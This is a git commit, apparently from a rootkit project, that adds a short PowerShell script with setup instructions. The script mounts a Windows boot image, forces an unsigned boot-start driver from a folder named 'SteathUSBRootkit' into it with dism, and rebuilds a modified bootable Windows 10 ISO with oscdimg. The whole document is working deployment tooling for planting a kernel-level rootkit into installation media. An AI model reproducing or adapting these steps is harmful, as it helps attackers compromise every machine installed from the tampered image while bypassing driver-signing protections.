6f4550a89b341eeed32c9cc6592ab26f635656a6
shaygitub <122000611+shaygitub@users.noreply.github.com>
2024-09-27 22:21:56 +0300

    added script and instructions for updating the modified ISO
    make sure that the path used for INF file of driver is updated and that oscdimg is downloaded before running

---
+++ UpdateISO.ps1
@@ -0,0 +1,4 @@
+﻿dism /Mount-Wim /WimFile:H:\mount-point\iso\sources\boot.wim /Index:1 /MountDir:H:\wim-mount
+dism /Image:H:\wim-mount /Add-Driver /Driver:H:\SteathUSBRootkit\BootStart\x64\Release\BootStart.inf /ForceUnsigned
+dism /Unmount-Wim /MountDir:H:\wim-mount /Commit
+oscdimg -bH:\mount-point\iso\boot\etfsboot.com -u2 -h -m -lWIN10MOD H:\mount-point\iso H:\mount-point\ModifiedISO.iso
